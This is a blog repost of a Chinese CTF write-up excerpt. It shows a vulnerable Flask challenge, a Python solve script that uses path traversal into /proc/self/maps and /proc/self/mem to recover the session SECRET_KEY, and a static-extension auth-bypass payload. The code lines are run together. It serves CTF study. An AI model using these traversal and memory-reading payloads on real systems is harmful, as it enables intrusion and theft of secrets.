+<figure class="highlight plaintext"><figcaption><span>osimport uuid</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">from flask import Flask, request, session, render_template, Markup</span><br><span class="line">from cat import catflag = &quot;&quot;app = Flask( __name__, static_url_path=&#x27;/&#x27;, static_folder=&#x27;static&#x27; )app.config[&#x27;SECRET_KEY&#x27;] = str(uuid.uuid4()).replace(&quot;-&quot;, &quot;&quot;) + &quot;*abcdefgh&quot;if os.path.isfile(&quot;/flag&quot;): flag = cat(&quot;/flag&quot;) os.remove(&quot;/flag&quot;)@app.route(&#x27;/&#x27;, methods=[&#x27;GET&#x27;])def index(): detailtxt = os.listdir(&#x27;./details/&#x27;) cats_list = [] for i in detailtxt: cats_list.append(i[:i.index(&#x27;.&#x27;)]) return render_template(&quot;index.html&quot;, cats_list=cats_list, cat=cat)@app.route(&#x27;/info&#x27;, methods=[&quot;GET&quot;, &#x27;POST&#x27;])def info(): filename = &quot;./details/&quot; + request.args.get(&#x27;file&#x27;, &quot;&quot;) start = request.args.get(&#x27;start&#x27;, &quot;0&quot;) end = request.args.get(&#x27;end&#x27;, &quot;0&quot;) name = request.args.get(&#x27;file&#x27;, &quot;&quot;)[:</span><br><span class="line">request.args.get(&#x27;file&#x27;, &quot;&quot;).index(&#x27;.&#x27;)] return render_template(&quot;detail.html&quot;, catname=name, info=cat(filename, start, end))@app.route(&#x27;/admin&#x27;, methods=[&quot;GET&quot;])def admin_can_list_root(): if session.get(&#x27;admin&#x27;) == 1: return flag else: session[&#x27;admin&#x27;] = 0 return &quot;NoNoNo&quot;if __name__ == &#x27;__main__&#x27;: app.run(host=&#x27;0.0.0.0&#x27;, debug=False, port=5637)&#x27;```</span><br><span class="line">cat.py```pyb&#x27;import os, sys, getopt</span><br><span class="line">def cat(filename, start=0, end=0)-&gt;bytes: data = b&#x27;&#x27; try: start = int(start) end = int(end) </span><br><span class="line">except: start=0 end=0 if filename != &quot;&quot; and os.access(filename, os.R_OK): f = open(filename, &quot;rb&quot;) if start &gt;= 0: f.seek(start) if end &gt;= start and end != 0: data = f.read(end-start) else: data = f.read() else: data = f.read() f.close() else: data = (&quot;File `%s` not exist or can not be read&quot; % filename).encode() return dataif __name__ == &#x27;__main__&#x27;: opts,args = getopt.getopt(sys.argv[1:],&#x27;-h-f:-s:-e:&#x27;,[&#x27;help&#x27;,&#x27;file=&#x27;,&#x27;start=&#x27;,&#x27;end=&#x27;]) fileName = &quot;&quot; start = 0 end = 0 for opt_name, opt_value in opts: if opt_name == &#x27;-h&#x27; or opt_name == &#x27;--help&#x27;: print(&quot;[*] Help&quot;) print(&quot;-f --file File name&quot;) print(&quot;-s --start Start position&quot;) print(&quot;-e --end End position&quot;) print(&quot;[*] Example of reading /etc/passwd&quot;) print(&quot;python3 cat.py -f /etc/passwd&quot;) print(&quot;python3 cat.py --file /etc/passwd&quot;) print(&quot;python3 cat.py -f /etc/passwd -s 1&quot;) print(&quot;python3 cat.py -f /etc/passwd -e 5&quot;) print(&quot;python3 cat.py -f /etc/passwd -s 1 -e 5&quot;) exit() elif opt_name == &#x27;-f&#x27; or opt_name == &#x27;--file&#x27;: fileName = opt_value elif opt_name == &#x27;-s&#x27; or opt_name == &#x27;--start&#x27;: start = opt_value elif opt_name == &#x27;-e&#x27; or opt_name == &#x27;--end&#x27;: end = opt_value if fileName != &quot;&quot;: print(cat(fileName, start, end)) else: print(&quot;No file to read&quot;)&#x27;```</span><br><span class="line">```pyimport requests, reurl = &quot;http://223.112.5.156:</span><br><span class="line">54007/&quot;maps_url = f&quot;&#123;url&#125;/info?file=../../../../../proc/self/maps&quot;#需要匹配的堆地址maps_reg = &quot;([a-z0-9]&#123;12&#125;-[a-z0-9]&#123;12&#125;) rw.*?00000000 00:00 0&quot;#从/proc/self/maps中匹配堆地址位置maps = re.findall(maps_reg, requests.get(maps_url).text)</span><br><span class="line"># print(maps)#从匹配到的结果一个个遍历读取for m in maps: start, end = m.split(&quot;-&quot;)[0], m.split(&quot;-&quot;)[1] start, end = str(int(start, 16)), str(int(end, 16)) read_url = f&quot;&#123;url&#125;/info?file=../../../../../proc/self/mem&amp;start=&#123;start&#125;&amp;end=&#123;end&#125;&quot; s = requests.get(read_url).content print(s) # 匹配的secret_key格式 rt = re.findall(b&quot;[a-z0-9]&#123;8&#125;[a-z0-9]&#123;4&#125;[a-z0-9]&#123;4&#125;[a-z0-9]&#123;4&#125;[a-z0-9]&#123;12&#125;*abcdefgh&quot;, s) if rt: print(rt)```</span><br><span class="line">```.css#.js#.jpg#.png#.gif#.ico```就不会进行认证，从而绕过登录payload```GET /a.css/../flag.html```</span><br></pre></td></tr></table></figure>
+
+
+<hr>
+<h2 id="附图"><a href="#附图" class="headerlink" title="附图"></a>附图</h2><p>[图片已移除]<br>[图片已移除]<br>[图片已移除]<br>[图片已移除]<br>[图片已移除]<br>[图片已移除]<br>[图片已移除]<br>[图片已移除]<br>[图片已移除]<br>[图片已移除]</p>
+<hr>
+<blockquote>
+<p><strong>转载声明</strong>：本文转载自 <a target="_blank" rel="noopener" href="https://github.com/Dest1ny-Sec/Des-CTF-Knowledge">Des-CTF-Knowledge</a>（MIT License），版权归原作者所有，转载请注明出处；如原作者不希望被转载，请联系删除。<br>原文链接：<a target="_blank" rel="noopener" href="https://www.ctfiot.com/89555.html">https://www.ctfiot.com/89555.html</a><br>仓库原文：<a target="_blank" rel="noopener" href="https://github.com/Dest1ny-Sec/Des-CTF-Knowledge/blob/main/CTF%E5%A4%A7%E8%B5%9BWP%E9%9B%86%E5%90%88/articles/NepnepxCATCTF%E9%83%A8%E5%88%86WriteUp.full.md">CTF大赛WP集合&#x2F;articles&#x2F;NepnepxCATCTF部分WriteUp.full.md</a></p>
+</blockquote>
+</article><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/vmdk-flag-%E6%90%9C%E7%B4%A2/">vmdk flag 搜索</a></div><div class="post_share"><div class="social-share" data-image="/img/youli.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/01/01/ctf-kb/wp/Misc/NahamCon_2023_Writeup/" title="NahamCon 2023 Writeup (JPEG 隐写 + Windows 加密 + qemu 镜像)"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">NahamCon 2023 Writeup (JPEG 隐写 + Windows 加密 + qemu 镜像)</div></div></a></div><div class="next-post pull-right"><a href="/2023/01/01/ctf-kb/wp/Misc/PatriotCTF_2023_Writeup/" title="PatriotCTF 2023 Writeup"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">PatriotCTF 2023 Writeup</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/youli.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">朴冬</div><div class="author-info__description">琐碎的学习记录</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">1050</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">879</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">16</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://space.bilibili.com/242470829?spm_id_from=333.1007.0.0"><i class="fab fa-bilibili"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/PUDONGGGGGG" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="/2559874620@qq.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a><a class="social-icon" href="https://space.bilibili.com/242470829?spm_id_from=333.1007.0.0" target="_blank" title="Bilibili"><i class="fab fa-bilibili" style="color: #1797cf;"></i></a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%99%84%E5%9B%BE"><span class="toc-number">1.</span> <span class="toc-text">附图</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/05/30/ctf-kb/%E5%B7%A5%E5%85%B7/Dirsearch/" title="Dirsearch">Dirsearch</a><time datetime="2026-05-29T16:00:00.000Z" title="发表于 2026-05-30 00:00:00">2026-05-30</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/05/30/ctf-kb/%E5%B7%A5%E5%85%B7/SCRIPTS-INDEX/" title="CTF 常用脚本索引">CTF 常用脚本索引</a><time datetime="2026-05-29T16:00:00.000Z" title="发表于 2026-05-30 00:00:00">2026-05-30</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/05/30/ctf-kb/%E5%B7%A5%E5%85%B7/ffuf%E7%9A%84%E4%BD%BF%E7%94%A8/" title="ffuf的使用">ffuf的使用</a><time datetime="2026-05-29T16:00:00.000Z" title="发表于 2026-05-30 00:00:00">2026-05-30</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2024 - 2026 By 朴冬</div><div class="footer_custom_text">Welcome</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="chat-btn" type="button" title="聊天"><i class="fas fa-sms"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="/js/tw_cn.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.13.0"></script></div></div></body></html>
